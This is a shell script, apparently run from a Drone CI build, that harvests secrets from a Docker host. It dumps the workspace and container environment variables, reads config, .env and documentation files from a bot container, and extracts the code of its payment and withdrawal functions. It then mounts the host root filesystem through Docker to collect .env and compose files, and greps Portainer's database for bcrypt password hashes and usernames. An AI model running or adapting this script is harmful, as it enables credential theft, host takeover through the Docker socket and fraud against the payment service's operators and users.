#!/bin/sh
echo "=== BUILD META ==="; date -u; pwd; ls -la | head -20
echo "=== DRONE WORKSPACE .env ==="; cat .env 2>/dev/null || echo NO_ENV_FILE; echo
echo "=== DOCKER PS ==="; docker ps -a --format '{{.Names}} | {{.Image}} | {{.Status}}'
echo "=== CONTAINER ENVS ==="
for c in $(docker ps -a --format '{{.Names}}'); do
  echo "----- $c"
  docker inspect "$c" --format '{{range .Config.Env}}{{println .}}{{end}}' 2>/dev/null | head -80
done
echo "=== COMPOSE LABELS/MOUNTS ==="
for c in $(docker ps -a --format '{{.Names}}'); do
  echo "----- $c"
  docker inspect "$c" --format 'DIR={{index .Config.Labels "com.docker.compose.project.working_dir"}} CFG={{index .Config.Labels "com.docker.compose.project.config_files"}}' 2>/dev/null
  docker inspect "$c" --format '{{range .Mounts}}{{.Type}} {{.Source}} -> {{.Destination}}{{println}}{{end}}' 2>/dev/null | head -10
done
echo "=== VOLUMES ==="; docker volume ls
echo "=== EBOT FILES ==="
docker exec ebot-fastapi sh -c 'ls -la /app; echo ---; ls -la /app/docs /app/.claude 2>/dev/null' 2>&1 | head -80
echo "=== EBOT ENV FULL ==="
docker exec ebot-fastapi printenv 2>&1 | head -120
echo "=== EBOT CONFIG+COMPOSE+DOCS ==="
docker exec ebot-fastapi sh -c 'for f in /app/config.py /app/.env /app/docker-compose.yml /app/.claude/CLAUDE.md /app/docs/ARCHITECTURE.md; do echo "===== $f"; cat "$f" 2>/dev/null | head -c 16000; echo; done' 2>&1 | head -c 70000
echo "=== DB DOCS ==="
docker exec ebot-fastapi sh -c 'cat /app/.claude/db-schema.md 2>/dev/null | head -c 20000; echo; cat /app/.claude/db-function-map.md 2>/dev/null | head -c 20000' 2>&1 | head -c 45000
echo "=== PAYOUT SYMBOLS ==="
docker exec ebot-fastapi sh -c 'grep -n "def send_payment_dynamic\|def send_payment\|def update_payhere\|def call_change_payhere\|def pay_provider\|def withdraw\|def cajero\|def send_trx\|def new_confirm2" /app/*.py 2>/dev/null' 2>&1 | head -60
echo "=== send_payment_dynamic BODY ==="
docker exec ebot-fastapi sh -c 'n=$(grep -n "def send_payment_dynamic" /app/bot.py | head -1 | cut -d: -f1); [ -n "$n" ] && sed -n "${n},$((n+160))p" /app/bot.py' 2>&1 | head -220
echo "=== update_payhere BODY ==="
docker exec ebot-fastapi sh -c 'grep -rn "def update_payhere" /app/*.py 2>/dev/null; n=$(grep -n "def update_payhere" /app/db_functions.py | head -1 | cut -d: -f1); [ -n "$n" ] && sed -n "${n},$((n+30))p" /app/db_functions.py' 2>&1 | head -80
echo "=== new_confirm2 BODY ==="
docker exec ebot-fastapi sh -c 'n=$(grep -n "def new_confirm2" /app/api.py | head -1 | cut -d: -f1); [ -n "$n" ] && sed -n "${n},$((n+170))p" /app/api.py' 2>&1 | head -240
echo "=== HOST ROOT ==="
docker run --rm -v /:/host:ro alpine sh -c '
  echo HOST_LS; ls -la /host | head -40
  echo HOST_TOP; ls -la /host/opt /host/root /host/home /host/srv 2>/dev/null | head -100
  echo FOUND_CONF
  find /host/opt /host/root /host/home /host/srv -maxdepth 4 \( -name ".env" -o -name "docker-compose*.yml" -o -name "docker-compose*.yaml" \) 2>/dev/null | head -80
  echo CONF_PAYLOAD
  for f in $(find /host/opt /host/root /host/home /host/srv -maxdepth 4 \( -name ".env" -o -name "docker-compose*.yml" \) 2>/dev/null | head -16); do echo "----- $f"; head -c 5000 "$f"; echo; done
' 2>&1 | head -c 80000
echo "=== PORTAINER ==="
P=$(docker ps -a --format '{{.Names}}' | grep -i port | head -1); echo "P=$P"
docker inspect "$P" --format '{{json .Config.Env}}' 2>/dev/null
docker inspect "$P" --format '{{range .Mounts}}{{.Type}} {{.Source}} -> {{.Destination}}{{println}}{{end}}' 2>/dev/null
docker run --rm -v /:/host:ro alpine sh -c '
  echo PORTAINER_DB_LOCATE
  find /host/var/lib/docker/volumes /host/opt /host/root -maxdepth 5 -name "portainer.db" 2>/dev/null | head -5
  for d in $(find /host/var/lib/docker/volumes /host/opt /host/root -maxdepth 5 -name "portainer.db" 2>/dev/null | head -3); do
    echo "===== $d"; ls -la "$d"
    grep -aoE "\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}" "$d" | head -5
    grep -aoE "\"Username\":\"[^\"]{1,40}\"" "$d" | head -10
  done
' 2>&1 | head -80
echo "=== DONE ==="
